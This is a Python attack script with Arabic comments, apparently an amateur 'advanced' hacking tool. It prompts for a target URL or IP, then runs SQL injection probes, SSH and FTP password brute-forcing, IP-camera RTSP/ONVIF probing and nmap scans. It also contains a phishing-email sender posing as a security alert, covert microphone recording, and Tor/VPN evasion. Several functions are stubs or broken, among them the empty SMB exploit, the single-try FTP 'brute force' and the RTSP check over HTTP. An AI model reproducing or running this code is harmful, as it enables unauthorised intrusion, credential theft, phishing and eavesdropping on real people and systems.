import socket
import threading
import os
import time
import requests
import subprocess
import base64
import random
import string
import logging
from Crypto.Cipher import AES
import pyautogui
import pyaudio
import wave
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import hashlib
import nmap
import re
import ssl
import socks
from impacket import smb
import paramiko
import ftplib
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

# إعدادات السجل
logging.basicConfig(filename='advanced_tool_log.txt', level=logging.DEBUG)

# التهرب باستخدام Tor وVPN
def use_tor_and_vpn():
    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
    socket.socket = socks.socksocket
    subprocess.run("openvpn --config myconfig.ovpn", shell=True)

# دالة لتوليد مفتاح AES باستخدام PBKDF2
def generate_aes_key():
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    salt = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    return kdf.derive(password.encode())

# دالة لتشفير البيانات باستخدام AES
def encrypt_data(data, key):
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data.encode())
    return cipher.nonce + tag + ciphertext

# تنفيذ هجوم SQL Injection
def detect_sql_injection(url, payload):
    try:
        response = requests.get(url + payload, headers={"User-Agent": "Mozilla/5.0"})
        if "error" in response.text or "sql" in response.text:
            logging.info(f"SQL Injection vulnerability detected: {url + payload}")
            return True
    except requests.exceptions.RequestException as e:
        logging.error(f"Error in SQL Injection test: {e}")
    return False

# هجوم SMB
def exploit_smb(target_ip):
    print(f"[INFO] Attempting SMB exploit on {target_ip}")
    smb_client = smb.SMB(target_ip)
    # تنفيذ الكود الخاص باختراق SMB

# دالة لمراقبة نشاط النظام
def record_audio(duration=10):
    print("[INFO] Starting audio recording...")
    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
    frames = []
    for i in range(0, int(44100 / 1024 * duration)):
        data = stream.read(1024)
        frames.append(data)
    print("[INFO] Audio recording complete.")
    stream.stop_stream()
    stream.close()
    p.terminate()

    with wave.open("captured_audio.wav", 'wb') as wf:
        wf.setnchannels(1)
        wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
        wf.setframerate(44100)
        wf.writeframes(b''.join(frames))

# Phishing Attack
def phishing_attack(target_email):
    msg = MIMEMultipart()
    msg['From'] = "fake_sender@example.com"
    msg['To'] = target_email
    msg['Subject'] = "Security Alert: Update Your Account"
    body = "Please click the link below to update your account info."
    msg.attach(MIMEText(body, 'plain'))
    try:
        server = smtplib.SMTP('smtp.example.com', 587)
        server.starttls()
        server.login("your_email@example.com", "your_password")
        server.sendmail("your_email@example.com", target_email, msg.as_string())
        server.quit()
        logging.info(f"[INFO] Phishing email sent to {target_email}")
    except Exception as e:
        logging.error(f"[ERROR] Failed to send phishing email: {e}")

# التحقق من كلمات المرور الضعيفة في SSH (Brute Force)
def brute_force_ssh(ip, username="admin", password_list=["admin", "123456", "password"]):
    for password in password_list:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password)
            print(f"[+] Brute Force success on {ip} with password: {password}")
            ssh.close()
            break
        except paramiko.AuthenticationException:
            print(f"[-] Failed to connect to {ip} with password {password}")

# اختبار RTSP كاميرات المراقبة (IP)
def test_rtsp_vulnerability(ip, port=554):
    rtsp_url = f"rtsp://{ip}:{port}"
    try:
        response = requests.get(rtsp_url, timeout=5)
        if response.status_code == 200:
            print(f"[+] RTSP service found on {ip}:{port}")
        else:
            print(f"[-] No RTSP service found on {ip}:{port}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error connecting to RTSP service at {ip}:{port}: {e}")

# اختبار ONVIF كاميرات المراقبة (IP)
def test_onvif_vulnerability(ip):
    onvif_url = f"http://{ip}/onvif/device_service"
    try:
        response = requests.get(onvif_url, timeout=5)
        if response.status_code == 200:
            print(f"[+] ONVIF service found on {ip}")
        else:
            print(f"[-] No ONVIF service found on {ip}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error connecting to ONVIF service at {ip}: {e}")

# فحص الشبكة باستخدام nmap
def network_scan(target_ip):
    nm = nmap.PortScanner()
    print(f"[INFO] Scanning {target_ip} for open ports...")
    nm.scan(hosts=target_ip, arguments='-p 80,443,554,8080')
    for host in nm.all_hosts():
        print(f"[INFO] Open ports on {host}: {nm[host].all_tcp()}")

# فتح FTP وإجراء اختبار ضعف على بروتوكول FTP
def ftp_brute_force(ip, username="admin", password_list=["admin", "123456", "password"]):
    try:
        ftp = ftplib.FTP(ip)
        ftp.login(username, password_list[0])  # محاولة أولى مع كلمة المرور
        print(f"[+] FTP Brute Force success on {ip} with password: {password_list[0]}")
        ftp.quit()
    except ftplib.all_errors as e:
        print(f"[-] FTP login failed for {ip}: {e}")

# Multi-target exploitation
def multi_target_attack(targets):
    for target in targets:
        print(f"[INFO] Attacking {target}")
        # تنفيذ هجوم على الهدف هنا
        if re.match(r"^http[s]?://", target):
            detect_sql_injection(target, "' OR 1=1")
        elif is_ip_address(target):
            exploit_smb(target)
            test_rtsp_vulnerability(target)
            test_onvif_vulnerability(target)
            brute_force_ssh(target)
            ftp_brute_force(target)

# دالة لاكتشاف IP
def is_ip_address(string):
    ip_pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
    return bool(re.match(ip_pattern, string))

# تنفيذ الهجمات
def main():
    # إدخال الأهداف من المستخدم
    target_type = input("Enter target type (1 for URL, 2 for IP, 3 for both): ")
    if target_type == "1":
        target_url = input("Enter target URL: ")
        multi_target_attack([target_url])
    elif target_type == "2":
        target_ip = input("Enter target IP: ")
        multi_target_attack([target_ip])
    elif target_type == "3":
        target_url = input("Enter target URL: ")
        target_ip = input("Enter target IP: ")
        multi_target_attack([target_url, target_ip])
    else:
        print("Invalid option. Please enter 1, 2, or 3.")

if __name__ == "__main__":
    main()
